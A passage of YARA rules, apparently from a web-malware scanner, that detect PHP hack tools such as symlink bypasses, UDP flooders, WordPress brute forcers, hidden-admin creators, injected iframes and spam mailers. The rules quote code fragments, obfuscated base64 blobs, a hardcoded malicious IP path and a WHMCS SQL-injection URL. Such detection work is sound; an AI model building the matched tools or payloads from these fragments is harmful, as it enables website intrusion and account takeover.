        $trigger = "if (is_dir($_POST['directory']) && !is_dir_empty($_POST['directory']))"
    condition:
        $trigger
}

private rule PR04326 : trigger
{
    strings:
        $ps0 = "$client = curlSend($clientidPacket, $this->settings['panel_username'], base64_decode($this->settings['panel_password"
    condition:
        $ps0
}

rule php_hacktool_ssv3_002 : hacktool
{
    strings:
        $trigger = "($_POST)"
    condition:
        $trigger and PR04326
}

rule php_hacktool_symlink_bypass_001 : hacktool
{
    strings:
        $trigger = "($as=0;$as<$fakedep;$as++)"
    condition:
        $trigger and PR01458
}

rule php_hacktool_symlink_bypass_002 : hacktool
{
    strings:
        $trigger = ">Symlink Bypass"
    condition:
        $trigger
}

private rule PR04327 : trigger
{
    strings:
        $ps0 = "eval(base64_decode($"
    condition:
        $ps0
}

private rule PR04328 : trigger
{
    strings:
        $ps0 = "@symlink('/home/"
    condition:
        $ps0
}

rule php_hacktool_symlink_bypass_003 : hacktool
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR04327 and PR00355 and PR04328 and PR01392 and PR00357
}

rule php_hacktool_symlink_bypass_004 : hacktool
{
    strings:
        $trigger = ">|BYPASS SYM"
    condition:
        $trigger and PR01330 and PR01479
}

rule php_hacktool_symlink_bypass_005 : hacktool
{
    strings:
        $trigger = "LZfHDqRaEkQ/53WLBd5pVhSewnvYjPDee75+6kmzQIA"
    condition:
        $trigger and PR00029 and PR01422
}

private rule PR04329 : trigger
{
    strings:
        $ps0 = "c2FmZV9tb2RlID0gT0ZG"
    condition:
        $ps0
}

rule php_hacktool_symlink_bypass_006 : hacktool
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR04329 and PR00355 and PR00357
}

rule php_hacktool_symlink_bypass_007 : hacktool
{
    strings:
        $trigger = "symlink('/'.$home.'/'.$user."
    condition:
        $trigger and PR00435
}

private rule PR04330 : trigger
{
    strings:
        $ps0 = "FILE_APPEND); chdir('../'); } $thisdir=dirname($_SERVER['PHP_SELF']); $domain"
    condition:
        $ps0
}

rule php_hacktool_symlink_bypass_008 : hacktool
{
    strings:
        $trigger = "curl_init("
    condition:
        $trigger and PR00435 and PR04330
}

private rule PR04331 : trigger
{
    strings:
        $ps0 = "$nama"
    condition:
        $ps0
}

private rule PR04332 : trigger
{
    strings:
        $ps0 = "DirectoryIndex priv.htm"
    condition:
        $ps0
}

rule php_hacktool_symlink_bypass_009 : hacktool
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR00355 and PR04331 and PR04332 and PR00357
}

rule php_hacktool_TrYaG_001 : hacktool
{
    strings:
        $trigger = "Turbo Force By TrYaG.CC"
    condition:
        $trigger and PR00029
}

rule php_hacktool_TrYaG_002 : hacktool
{
    strings:
        $trigger = "eval($OOO0000O0('JE8wMDBPME8wMD0kT09PMDAwTzAwKCRPT08wTzBPMDAsJ3JiJyk7JE8wTzAwT08wMCgkTzAwME8wTzAwLDB4NGI1KTskT08"
    condition:
        $trigger
}

rule php_hacktool_TrYaG_003 : hacktool
{
    strings:
        $trigger = "XHg3N1x4NzdceDc3Llx4NzRceDcyXHg3OWFceDY3XHgyZWNceDYz"
    condition:
        $trigger and PR01398
}

rule php_hacktool_twitterbruteforce_001 : hacktool
{
    strings:
        $trigger = "////Twitter Brute Force By Mauritania Attacker//////"
    condition:
        $trigger
}

private rule PR04333 : trigger
{
    strings:
        $ps0 = "<b>UDP Flood"
    condition:
        $ps0
}

rule php_hacktool_UDPflood_001 : hacktool
{
    strings:
        $trigger = "fsockopen"
    condition:
        $trigger and PR04333
}

rule php_hacktool_UDPflood_002 : hacktool
{
    strings:
        $trigger = "$fp = fsockopen(\"udp://$host\", $port, $errno, $errstr, 5);"
    condition:
        $trigger
}

private rule PR04334 : trigger
{
    strings:
        $ps0 = "echo 'Phate\\'s UDP Flooder V' . $version"
    condition:
        $ps0
}

rule php_hacktool_UDPflood_003 : hacktool
{
    strings:
        $trigger = "fsockopen"
    condition:
        $trigger and PR04334
}

private rule PR04335 : trigger
{
    strings:
        $ps0 = "fsockopen(decrypt($this->"
    condition:
        $ps0
}

private rule PR04336 : trigger
{
    strings:
        $ps0 = "or strtolower(@ini_get(\"safe_mode"
    condition:
        $ps0
}

rule php_hacktool_UDPflood_004 : hacktool
{
    strings:
        $trigger = "fsockopen(\"udp:"
    condition:
        $trigger and PR04335 and PR04336
}

private rule PR04337 : trigger
{
    strings:
        $ps0 = "MB) packets averaging \". round($packets/$exec_time"
    condition:
        $ps0
}

rule php_hacktool_UDPflood_005 : hacktool
{
    strings:
        $trigger = "fsockopen"
    condition:
        $trigger and PR04337
}

private rule PR04338 : trigger
{
    strings:
        $ps0 = "ignore_user_abort(TRUE);"
    condition:
        $ps0
}

private rule PR04339 : trigger
{
    strings:
        $ps0 = "isset($_GET['time'])){"
    condition:
        $ps0
}

private rule PR04340 : trigger
{
    strings:
        $ps0 = "udp://"
    condition:
        $ps0
}

rule php_hacktool_UDPflood_006 : hacktool
{
    strings:
        $trigger = "fsockopen"
    condition:
        $trigger and PR04338 and PR04339 and PR04340
}

rule php_hacktool_UDPflood_007 : hacktool
{
    strings:
        $trigger = "$fp = fsockopen('udp://'.$dest, $port, $errno, $errstr, 5);"
    condition:
        $trigger
}

private rule PR04341 : trigger
{
    strings:
        $ps0 = "$files = array("
    condition:
        $ps0
}

rule php_hacktool_unlink_001 : hacktool
{
    strings:
        $trigger = "echo \"File $file not found <br>\";"
    condition:
        $trigger and PR00203 and PR04341 and PR02020
}

private rule PR04342 : trigger
{
    strings:
        $ps0 = "file_get_contents('../../"
    condition:
        $ps0
}

private rule PR04343 : trigger
{
    strings:
        $ps0 = "unpack('N*"
    condition:
        $ps0
}

rule php_hacktool_unpacker_001 : hacktool
{
    strings:
        $trigger = "eval($"
    condition:
        $trigger and PR04342 and PR04343
}

private rule PR04344 : trigger
{
    strings:
        $ps0 = "if(!$_POST[\"todir\"]) $_POST[\"todir\"] = \".\";"
    condition:
        $ps0
}

rule php_hacktool_unzip_001 : hacktool
{
    strings:
        $trigger = "if(!$_REQUEST[\"myaction\"]==\"dounzip\"){"
    condition:
        $trigger and PR04344
}

rule php_hacktool_unzip_002 : hacktool
{
    strings:
        $trigger = "<title>unzip file by"
    condition:
        $trigger and PR00039 and PR02056
}

rule php_hacktool_unzip_003 : hacktool
{
    strings:
        $trigger = "echo \"<p><b>List of auto detected .zip archives!</b></p>\";"
    condition:
        $trigger and PR00039
}

private rule PR04345 : trigger
{
    strings:
        $ps0 = "$removeorig = $_GET['removeorig'];"
    condition:
        $ps0
}

rule php_hacktool_unzip_004 : hacktool
{
    strings:
        $trigger = "echo \"Deleting Zip...<br />\\n\";"
    condition:
        $trigger and PR00042 and PR04345
}

private rule PR04346 : trigger
{
    strings:
        $ps0 = "$archive = new PclZip(__DIR__.'/'.$archive_id.'/'.$resp['name']);"
    condition:
        $ps0
}

rule php_hacktool_unzip_006 : hacktool
{
    strings:
        $trigger = "curl_query(json_encode(['mode' => 'archive_unpacking', 'operation_id' => $archive_id,"
    condition:
        $trigger and PR00029 and PR00507 and PR01819 and PR04346
}

rule php_hacktool_unzip_007 : hacktool
{
    strings:
        $trigger = "gzopen($archive, \"rb\");"
    condition:
        $trigger and PR01330 and PR00046
}

private rule PR04347 : trigger
{
    strings:
        $ps0 = "upload_settings_image.php\")"
    condition:
        $ps0
}

rule php_hacktool_upload_settings_image_exploit_001 : hacktool
{
    strings:
        $trigger = "array('Filedata'=>\"@$uploadfile\"));"
    condition:
        $trigger and PR04347 and PR00507
}

rule php_hacktool_varnish_bypass_001 : hacktool
{
    strings:
        $trigger = "wp_remote_request( \"http://\".$_SERVER['HTTP_HOST'].\"/gd-config.php\", array("
    condition:
        $trigger
}

private rule PR04348 : trigger
{
    strings:
        $ps0 = "$rec\x09= $_GET['to'];"
    condition:
        $ps0
}

rule php_hacktool_virus_mailer_001 : hacktool
{
    strings:
        $trigger = "\"==Multipart_Boundary_x{$semi_rand}x\";"
    condition:
        $trigger and PR00437 and PR00301 and PR04348
}

private rule PR04349 : trigger
{
    strings:
        $ps0 = "$info['db_password"
    condition:
        $ps0
}

rule php_hacktool_VP_restore_001 : hacktool
{
    strings:
        $trigger = "new VP_Restore_Helper();"
    condition:
        $trigger and PR00435 and PR04349
}

rule php_hacktool_webroot_001 : hacktool
{
    strings:
        $trigger = "<title>WebRoot Hack Tools</title>"
    condition:
        $trigger and PR00301
}

private rule PR04350 : trigger
{
    strings:
        $ps0 = "class Whm{"
    condition:
        $ps0
}

private rule PR04351 : trigger
{
    strings:
        $ps0 = "$newpass = file_get_contents"
    condition:
        $ps0
}

rule php_hacktool_whmhack_001 : hacktool
{
    strings:
        $trigger = "fsockopen"
    condition:
        $trigger and PR04350 and PR04351
}

private rule PR04352 : trigger
{
    strings:
        $ps0 = "ZZNta9swEMc/gMHf4SYCcmhqZ4wySC23o2z0zdjYCnuRBSPb"
    condition:
        $ps0
}

rule php_hacktool_whmhack_002 : hacktool
{
    strings:
        $trigger = "gzinflate(base64_decode("
    condition:
        $trigger and PR00029 and PR04352
}

private rule PR04353 : trigger
{
    strings:
        $ps0 = "<title>WHMSeller</title>"
    condition:
        $ps0
}

rule php_hacktool_whmhack_003 : hacktool
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR04353 and PR00355 and PR00357
}

rule php_hacktool_whmcsexp_001 : hacktool
{
    strings:
        $trigger = "\"/viewticket.php?tid[sqltype]=TABLEJOIN&tid[value]=-1%20union"
    condition:
        $trigger and PR01401
}

private rule PR04354 : trigger
{
    strings:
        $ps0 = "Cilent CC"
    condition:
        $ps0
}

private rule PR04355 : trigger
{
    strings:
        $ps0 = "tblregistrars"
    condition:
        $ps0
}

rule php_hacktool_whmcsexp_002 : hacktool
{
    strings:
        $trigger = "mysql"
    condition:
        $trigger and PR04354 and PR04355
}

private rule PR04356 : trigger
{
    strings:
        $ps0 = "href=\"?Clientsr00ts\">"
    condition:
        $ps0
}

rule php_hacktool_whmcsexp_002_02 : hacktool
{
    strings:
        $trigger = "mysql"
    condition:
        $trigger and PR04355 and PR04356
}

private rule PR04357 : trigger
{
    strings:
        $ps0 = "&testcookie=1"
    condition:
        $ps0
}

rule php_hacktool_wordpress_bruteforce_001 : hacktool
{
    strings:
        $trigger = "Wordpress Brute Force Tool"
    condition:
        $trigger and PR01401 and PR04357
}

rule php_hacktool_wordpress_bruteforce_002 : hacktool
{
    strings:
        $trigger = "$data[$i] = array('url' => $link[0], 'post' => 'log='.$link[1].'&pwd='.$link[2].'&testcookie=1&wp-submit=1&redirect_to='.$redirect_to);"
    condition:
        $trigger and PR01401
}

rule php_hacktool_wordpress_bruteforce_003 : hacktool
{
    strings:
        $trigger = "la_brute($url, $username, $wordlist, $thread, $log)"
    condition:
        $trigger and PR01401 and PR04357
}

rule php_hacktool_wordpress_bruteforce_004 : hacktool
{
    strings:
        $trigger = "<value><array><data><value><string>'.macroses($site, $login)"
    condition:
        $trigger and PR00435 and PR00341
}

rule php_hacktool_wordpress_bruteforce_005 : hacktool
{
    strings:
        $trigger = "Priv8 Wordpress Mass brute Force"
    condition:
        $trigger and PR00029 and PR01436
}

// MANUAL FIX NECESSARY
private rule PR04358 : trigger
{
    strings:
        $ps0 = "if($pass_count == count($passwords) - 1){"
    condition:
        $ps0
}

rule php_hacktool_wordpress_bruteforce_006 : hacktool
{
    strings:
        $trigger = "$_POST"
        $php_hacktool_wordpress_bruteforce_006_r0 = /\}[\s]*\?>/
    condition:
        $trigger and PR04358 and PR00397 and $php_hacktool_wordpress_bruteforce_006_r0
}

private rule PR04359 : trigger
{
    strings:
        $ps0 = "fwrite($fp, implode(';', $dbLine).\";$row[0]\\n\");"
    condition:
        $ps0
}

rule php_hacktool_wordpress_bruteforce_007 : hacktool
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR04359 and PR01392 and PR00357
}

rule php_hacktool_wpepr_001 : hacktool
{
    strings:
        $trigger = "<h2>WordPress Emergency PassWord Reset</h2>"
    condition:
        $trigger and PR00437 and PR00301 and PR01123
}

private rule PR04360 : trigger
{
    strings:
        $ps0 = "wp_set_auth_cookie($user_ids)"
    condition:
        $ps0
}

rule php_hacktool_wp_admin_hider_001 : hacktool
{
    strings:
        $trigger = "WHERE 1=1 AND {$wpdb->users}.user_login !="
    condition:
        $trigger and PR04360 and PR01480
}

// MANUAL FIX NECESSARY
private rule PR04361 : trigger
{
    strings:
        $ps0 = "->query_where = str_replace("
    condition:
        $ps0
}

rule php_hacktool_wp_admin_hider_002 : hacktool
{
    strings:
        $trigger = "WHERE 1=1 AND {$wpdb->users}.user_login !="
        $php_hacktool_wp_admin_hider_002_r0 = /add_action\(.pre_user_query.,[^\?]+WHERE 1=1 AND \{\$wpdb->users\}\.user_login !=[\s]*[^;]+\);[\s]*[\s\}]+(\)\;[\s]*)*(function hide_user_count\(\)[^\}]+\}[^\?]+<\?php[\s]*\}[\s]*add_action\([^;]+hide_user_count.\);[\s]*|add_filter\(.views_users.,[^;]+\);[\s]*function [\w]+list_table_views[^\*]+\$all_num[^;]+;[\s]*return \$views;[\s]*\})*/
    condition:
        $trigger and PR04361 and $php_hacktool_wp_admin_hider_002_r0
}

rule php_hacktool_wp_admin_hider_002_02 : hacktool
{
    strings:
        $trigger = "WHERE 1=1 AND {$wpdb->users}.user_login !="
    condition:
        $trigger and PR04361 and PR01344
}

private rule PR04362 : trigger
{
    strings:
        $ps0 = "function hide_ghosts($user_search)"
    condition:
        $ps0
}

rule php_hacktool_wp_admin_hider_003 : hacktool
{
    strings:
        $trigger = "pass"
    condition:
        $trigger and PR04362 and PR02574
}

private rule PR04363 : trigger
{
    strings:
        $ps0 = "function hide_user_count(){"
    condition:
        $ps0
}

private rule PR04364 : trigger
{
    strings:
        $ps0 = ".wp-admin.users-php span.count {display: none;}"
    condition:
        $ps0
}

rule php_hacktool_wp_admin_hider_004 : hacktool
{
    strings:
        $trigger = ">"
    condition:
        $trigger and PR04363 and PR04364
}

private rule PR04365 : trigger
{
    strings:
        $ps0 = "echo \"Successfully created user with id: {$insert_user_result}\";"
    condition:
        $ps0
}

private rule PR04366 : trigger
{
    strings:
        $ps0 = "die($insert_user_result->get_error_message());"
    condition:
        $ps0
}

rule php_hacktool_wp_admin_hider_005 : hacktool
{
    strings:
        $trigger = "WHERE 1=1 AND {$wpdb->users}.user_login !="
    condition:
        $trigger and PR04365 and PR04366 and PR01480
}

private rule PR04367 : trigger
{
    strings:
        $ps0 = "<a href=\"users.php?role="
    condition:
        $ps0
}

private rule PR04368 : trigger
{
    strings:
        $ps0 = "$value->response[ plugin_basename(__FILE__)"
    condition:
        $ps0
}

rule php_hacktool_wp_admin_hider_006 : hacktool
{
    strings:
        $trigger = "WHERE 1=1 AND {$wpdb->users}.user_login !="
    condition:
        $trigger and PR04361 and PR04367 and PR04368
}

private rule PR04369 : trigger
{
    strings:
        $ps0 = "strpos($user_view[$keys]"
    condition:
        $ps0
}

rule php_hacktool_wp_admin_hider_006_02 : hacktool
{
    strings:
        $trigger = "WHERE 1=1 AND {$wpdb->users}.user_login !="
    condition:
        $trigger and PR04361 and PR04367 and PR04369
}

private rule PR04370 : trigger
{
    strings:
        $ps0 = "print \"\\nWANT TO BRUTEFORCE VIA XMLRPC ? [Y/n]: \""
    condition:
        $ps0
}

rule php_hacktool_wp_attacker_001 : hacktool
{
    strings:
        $trigger = "system("
    condition:
        $trigger and PR04370
}

private rule PR04371 : trigger
{
    strings:
        $ps0 = "CURLOPT_POSTFIELDS,\"log=\".$username.\"&pwd=\".$password.\"&wp-submit="
    condition:
        $ps0
}

rule php_hacktool_wp_attacker_002 : hacktool
{
    strings:
        $trigger = "($_POST)"
    condition:
        $trigger and PR04371
}

private rule PR04372 : trigger
{
    strings:
        $ps0 = "echo \" | is wordpress (path: $wordpress_path)\";"
    condition:
        $ps0
}

rule php_hacktool_wp_attacker_003 : hacktool
{
    strings:
        $trigger = "/etc/"
    condition:
        $trigger and PR03855 and PR04372
}

private rule PR04373 : trigger
{
    strings:
        $ps0 = "$wpdb->query(\"DROP TABLE IF EXISTS admin\");"
    condition:
        $ps0
}

private rule PR04374 : trigger
{
    strings:
        $ps0 = "$wpincludesdir = 'wp-includes/';"
    condition:
        $ps0
}

private rule PR04375 : trigger
{
    strings:
        $ps0 = "if (is_dir($file)) recursiveRemove($file);"
    condition:
        $ps0
}

rule php_hacktool_wp_attacker_004 : hacktool
{
    strings:
        $trigger = "require_once"
    condition:
        $trigger and PR04373 and PR04374 and PR04375 and PR03741
}

rule php_hacktool_wp_attacker_005 : hacktool
{
    strings:
        $trigger = "str_replace(\"define('DISALLOW_FILE_MODS', true);\",\"\""
    condition:
        $trigger and PR02803
}

rule php_hacktool_wp_attacker_006 : hacktool
{
    strings:
        $trigger = "base64_decode(\"PD9waHAKZGVmaW5lKCdXUF9VU0VfVEhFTUVTJywgdHJ1ZSk7CgovKiogTG9hZHMgdGhlIFdvcmRQcmVzcyBFbnZpcm9ubWVudCBhbmQgVGVtcGxhdGUgKi8KcmVxdWlyZSggZGlybmFtZSggX19GSUxFX18gKSAuICcvd3AtYmxvZy1oZWFkZXIucGhwJyApOw==\");"
    condition:
        $trigger and PR00435
}

private rule PR04376 : trigger
{
    strings:
        $ps0 = "}}($query_str);foreach($user_ids as $uid){$user_id=$uid->ID;if($GLOBALS{"
    condition:
        $ps0
}

rule php_hacktool_wp_attacker_007 : hacktool
{
    strings:
        $trigger = "ror_reporting"
    condition:
        $trigger and PR04376
}

private rule PR04377 : trigger
{
    strings:
        $ps0 = "is_file("
    condition:
        $ps0
}

rule php_hacktool_wp_attacker_008 : hacktool
{
    strings:
        $trigger = "')) {rename($_SERVER['DOCUMENT_ROOT'].'/wp-content/plugins"
    condition:
        $trigger and PR04377
}

private rule PR04378 : trigger
{
    strings:
        $ps0 = "],$user_login);echo \"You are logged in as $user_login\";if($GLOBALS["
    condition:
        $ps0
}

rule php_hacktool_wp_attacker_010 : hacktool
{
    strings:
        $trigger = "]);$query_str=\"SELECT ID FROM $wpdb->users\";$user_ids=$wpdb->{$GLOBALS["
    condition:
        $trigger and PR04378 and PR00675
}

private rule PR04379 : trigger
{
    strings:
        $ps0 = "<title>WordPress Mass Password Changer |"
    condition:
        $ps0
}

rule php_hacktool_wp_mass_passw_changer_001 : hacktool
{
    strings:
        $trigger = "POST"
    condition:
        $trigger and PR04379
}

rule php_hacktool_wp_mass_passw_changer_002 : hacktool
{
    strings:
        $trigger = "<title>Wordpress Mass Change Password</title>"
    condition:
        $trigger and PR00507
}

private rule PR04380 : trigger
{
    strings:
        $ps0 = "if ($pw !== $PASSWORD) {"
    condition:
        $ps0
}

rule php_hacktool_wp_pbn_001 : hacktool
{
    strings:
        $trigger = ".DB_NAME.\"`.`wp_pbn` "
    condition:
        $trigger and PR00507 and PR04380
}

rule php_hacktool_wp_plugin_hider_001 : hacktool
{
    strings:
        $trigger = "add_action('pre_current_active_plugins', '"
    condition:
        $trigger and PR02090
}

private rule PR04381 : trigger
{
    strings:
        $ps0 = "if(isset($_POST) && isset($_POST["
    condition:
        $ps0
}

rule php_hacktool_wp_siteurl_001 : hacktool
{
    strings:
        $trigger = "update `{$thisPreFix}options` set `option_value`='{$siteUrl}' where `option_name` in('siteurl','home')"
    condition:
        $trigger and PR04381 and PR03806
}

private rule PR04382 : trigger
{
    strings:
        $ps0 = "detect_define('DB_PASSWORD'"
    condition:
        $ps0
}

rule php_hacktool_wp_users_001 : hacktool
{
    strings:
        $trigger = "file_get_contents('wp-config.php');"
    condition:
        $trigger and PR04382
}

private rule PR04383 : trigger
{
    strings:
        $ps0 = "if ($request['task'] == 'changepassword'){"
    condition:
        $ps0
}

rule php_hacktool_wp_users_002 : hacktool
{
    strings:
        $trigger = "echo ($arr_result)?json_encode($arr_result):"
    condition:
        $trigger and PR04383 and PR00507
}

rule php_hacktool_wp_users_003 : hacktool
{
    strings:
        $trigger = "isset($_POST['add-user-mysql-method']"
    condition:
        $trigger and PR00265
}

// MANUAL FIX NECESSARY
private rule PR04384 : trigger
{
    strings:
        $ps0 = "$pass = '"
    condition:
        $ps0
}

rule php_hacktool_wp_users_004 : hacktool
{
    strings:
        $trigger = "$user->set_role( 'administrator' );"
        $php_hacktool_wp_users_004_r0 = /function[\s]*[\w]*_?admin_account\(\)[\s]*\{[\s]*\$user[^;]+;[\s]*\$pass[^@]+[\s]*\$email[^;]+;[\s]*if/
    condition:
        $trigger and PR01533 and PR04384 and $php_hacktool_wp_users_004_r0
}

private rule PR04385 : trigger
{
    strings:
        $ps0 = "if( isset($_GET['ok']) ) { echo '<!-- Silence is golden. -->';}"
    condition:
        $ps0
}

rule php_hacktool_wp_users_006 : hacktool
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR00355 and PR00357 and PR04385
}

private rule PR04386 : trigger
{
    strings:
        $ps0 = "$query_str = \"SELECT ID FROM $wpdb->users\";"
    condition:
        $ps0
}

rule php_hacktool_wp_users_007 : hacktool
{
    strings:
        $trigger = "exit;"
    condition:
        $trigger and PR00039 and PR02056 and PR04386
}

private rule PR04387 : trigger
{
    strings:
        $ps0 = "wp_mail( $email_address, 'Welcome!', 'Your Password:"
    condition:
        $ps0
}

rule php_hacktool_wp_users_008 : hacktool
{
    strings:
        $trigger = "pass"
    condition:
        $trigger and PR04387 and PR03735
}

// MANUAL FIX NECESSARY
private rule PR04388 : trigger
{
    strings:
        $ps0 = "$creds['remember']"
    condition:
        $ps0
}

rule php_hacktool_wp_users_009 : hacktool
{
    strings:
        $trigger = "$_GET["
        $php_hacktool_wp_users_009_r0 = /mysql[\w\->]+\(.UPDATE[\s]*\{\$table_prefix\}users[\s]*SET[\s]*user_pass[\s]*=[\s]*.\{\$[\w]+\}.[\s]*WHERE[\s]*ID[\s]*=[\s]*.\{\$[\w]+\}..\);?/
    condition:
        $trigger and PR04388 and PR00397 and $php_hacktool_wp_users_009_r0
}

private rule PR04389 : trigger
{
    strings:
        $ps0 = "$param = str_replace(\"%DOMAIN%\", $main_dom[0], $param);"
    condition:
        $ps0
}

rule php_hacktool_wp_users_010 : hacktool
{
    strings:
        $trigger = "$_POST"
    condition:
        $trigger and PR00092 and PR04389
}

rule php_hacktool_wp_users_011 : hacktool
{
    strings:
        $trigger = "(!empty($_COOKIE['wordpress_test_cookies'])"
    condition:
        $trigger and PR03712
}

rule php_hacktool_wp_users_012 : hacktool
{
    strings:
        $trigger = "echo \"<p>domain: \".$_SERVER['SERVER_NAME'].\" \".$v['user_login'].\" \".$v['user_pass']"
    condition:
        $trigger
}

private rule PR04390 : trigger
{
    strings:
        $ps0 = "<h1><span><nobr><a href=\"<?php echo admin_url(); ?>\">Go to admin dashboard</a> - <a href=\"<?php echo $_SERVER['PHP_SELF']"
    condition:
        $ps0
}

rule php_hacktool_wp_users_013 : hacktool
{
    strings:
        $trigger = "do_action"
    condition:
        $trigger and PR02056 and PR04390
}

// MANUAL FIX NECESSARY
rule php_hacktool_wp_users_014 : hacktool
{
    strings:
        $trigger = "add_action('init"
        $php_hacktool_wp_users_014_r0 = /wp_create_user\([\s]*\$[\w]+,[\s]*\$[\w]+,[\s]*\$[\w]+[\s]*\);[\s]*\$[\w]+[\s]*=[\s]*get_user_by\([^\}]+add_role\([\s]*.administrator.[\s]*\);[\s]*\}[\s]*\}/
    condition:
        $trigger and $php_hacktool_wp_users_014_r0
}

private rule PR04391 : trigger
{
    strings:
        $ps0 = "wp_redirect(get_bloginfo"
    condition:
        $ps0
}

private rule PR04392 : trigger
{
    strings:
        $ps0 = "if (!empty($password) && $password == $password2) {"
    condition:
        $ps0
}

rule php_hacktool_wp_users_015 : hacktool
{
    strings:
        $trigger = "extract"
    condition:
        $trigger and PR02034 and PR04391 and PR04392
}

// MANUAL FIX NECESSARY
private rule PR04393 : trigger
{
    strings:
        $ps0 = "new WP_User"
    condition:
        $ps0
}

rule php_hacktool_wp_users_016 : hacktool
{
    strings:
        $trigger = "$user->set_role( 'administrator' );"
        $php_hacktool_wp_users_016_r0 = /function[\s]*[\w]+\(\)[\s]*\{[\s]*\$[\w]+[\s]*=[\s]*.[\w]+.;[^\{]+!username_exists\([\s]*\$[\w]+[\s]*\)[\s]*\&\&[\s]*!email_exists\([\s]*\$/
    condition:
        $trigger and PR04393 and PR01533 and $php_hacktool_wp_users_016_r0
}

rule php_hacktool_wp_users_018 : hacktool
{
    strings:
        $trigger = "limit 1\");exit(\"ok\");}if(isset($g['npass'])){wp_set_password("
    condition:
        $trigger and PR00701
}

private rule PR04394 : trigger
{
    strings:
        $ps0 = "MD5("
    condition:
        $ps0
}

private rule PR04395 : trigger
{
    strings:
        $ps0 = "INSERT INTO `\".$dbname"
    condition:
        $ps0
}

rule php_hacktool_wp_users_020 : hacktool
{
    strings:
        $trigger = "mysql"
    condition:
        $trigger and PR04394 and PR03877 and PR04395
}

private rule PR04396 : trigger
{
    strings:
        $ps0 = "users` (`ID`, `user_login"
    condition:
        $ps0
}

private rule PR04397 : trigger
{
    strings:
        $ps0 = "INSERT INTO"
    condition:
        $ps0
}

rule php_hacktool_wp_users_021 : hacktool
{
    strings:
        $trigger = "wp-config"
    condition:
        $trigger and PR01480 and PR04396 and PR04397
}

private rule PR04398 : trigger
{
    strings:
        $ps0 = "$user = get_user_by('email"
    condition:
        $ps0
}

rule php_hacktool_wp_users_022 : hacktool
{
    strings:
        $trigger = "automatically_log_me_in($newuser_id);"
    condition:
        $trigger and PR00281 and PR04398 and PR00247
}

private rule PR04399 : trigger
{
    strings:
        $ps0 = ">Enter Administrator Password"
    condition:
        $ps0
}

private rule PR04400 : trigger
{
    strings:
        $ps0 = "(md5($_POST['password'].\""
    condition:
        $ps0
}

private rule PR04401 : trigger
{
    strings:
        $ps0 = "$_SESSION['loggedIn'] = true;"
    condition:
        $ps0
}

rule php_hacktool_wp_users_023 : hacktool
{
    strings:
        $trigger = "<input"
    condition:
        $trigger and PR00042 and PR00046 and PR04399 and PR04400 and PR04401
}

rule php_hacktool_WPBackdoor_001 : hacktool
{
    strings:
        $trigger = "<title>WP Backdoor User"
    condition:
        $trigger
}

rule php_hacktool_WPBackdoor_002 : hacktool
{
    strings:
        $trigger = "<title>Wordpress MassDeface"
    condition:
        $trigger
}

rule php_hacktool_wpuserdisclose_001 : hacktool
{
    strings:
        $trigger = "add_action('init', 'barry');"
    condition:
        $trigger
}

private rule PR04402 : trigger
{
    strings:
        $ps0 = "if(isset($_SESSION['xsenderid']))"
    condition:
        $ps0
}

rule php_hacktool_xsender_mailer_001 : hacktool
{
    strings:
        $trigger = "$_POST"
    condition:
        $trigger and PR00437 and PR00301 and PR04402
}

private rule PR04403 : trigger
{
    strings:
        $ps0 = "5.39.222.143/b92t"
    condition:
        $ps0
}

private rule PR04404 : trigger
{
    strings:
        $ps0 = "/*mx_start*/"
    condition:
        $ps0
}

rule php_iframe_mx_start_001 : iframe
{
    strings:
        $trigger = "<ifram"
    condition:
        $trigger and PR04403 and PR04404
}

private rule PR04405 : trigger
{
    strings:
        $ps0 = "/*mx_start*/<?php"
    condition:
        $ps0
}

rule php_iframe_mx_start_002 : iframe
{
    strings:
        $trigger = "<ifram"
    condition:
        $trigger and PR04405
}

private rule PR04406 : trigger
{
    strings:
        $ps0 = "<iframe src="
    condition:
        $ps0
}

rule php_iframe_photo_scr_001 : iframe
{
    strings:
        $trigger = "Photo.scr"
    condition:
        $trigger and PR04406
}

rule php_injected_fake_wp_jquery_001 : injected
{
    strings:
        $trigger = "add_action('wp_footer', 'wp_func_jquery')"
    condition:
        $trigger
}

private rule PR04407 : trigger
{
    strings:
        $ps0 = "}add_action("
    condition:
        $ps0
}

private rule PR04408 : trigger
{
    strings:
        $ps0 = "/jquery-"
    condition:
        $ps0
}

rule php_injected_fake_wp_jquery_002 : injected
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR04407 and PR04408 and PR03889
}

private rule PR04409 : trigger
{
    strings:
        $ps0 = "echo \"$data\";"
    condition:
        $ps0
}

rule php_injected_fake_wp_jquery_003 : injected
{
    strings:
        $trigger = "(function_exists('curl_init'))"
    condition:
        $trigger and PR04409 and PR04408
}

private rule PR04410 : trigger
{
    strings:
        $ps0 = "$url=\"$a:$b/$c/$test\";"
    condition:
        $ps0
}

rule php_injected_fake_wp_jquery_004 : injected
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR04410 and PR03889
}

rule php_injected_scounter_001 : injected
{
    strings:
        $trigger = "add_action('get_footer', 'add_ssc"
    condition:
        $trigger
}

private rule PR04411 : trigger
{
    strings:
        $ps0 = "add_action('wp_footer"
    condition:
        $ps0
}

rule php_injected_wp_footer_script_001 : injected
{
    strings:
        $trigger = "(){echo'<script type=\"text/javascript\">var "
    condition:
        $trigger and PR04411
}

rule php_injected_wp_footer_script_002 : injected
{
    strings:
        $trigger = "pack(\"H*\",\"3c73637269707420747970653d22746578742f6a617661736372697074223e76617220"
    condition:
        $trigger and PR02092
}

private rule PR04412 : trigger
{
    strings:
        $ps0 = "Plugin Name: WPCore2"
    condition:
        $ps0
}

rule php_injected_WPCore2_001 : injected
{
    strings:
        $trigger = "add_action("
    condition:
        $trigger and PR04412
}

private rule PR04413 : trigger
{
    strings:
        $ps0 = "post_content NOT LIKE '%torrent%"
    condition:
        $ps0
}

rule php_injected_WPCore2_002 : injected
{
    strings:
        $trigger = "add_action("
    condition:
        $trigger and PR04413
}

rule php_mailer_BANKZ_001 : mailer
{
    strings:
        $trigger = "=BANKZ="
    condition:
        $trigger and PR00301
}

rule php_mailer_BOAClient_001 : mailer
{
    strings:
        $trigger = "~!BOA Client!~"
    condition:
        $trigger and PR00301
}

rule php_mailer_COOKIE_001 : mailer
{
    strings:
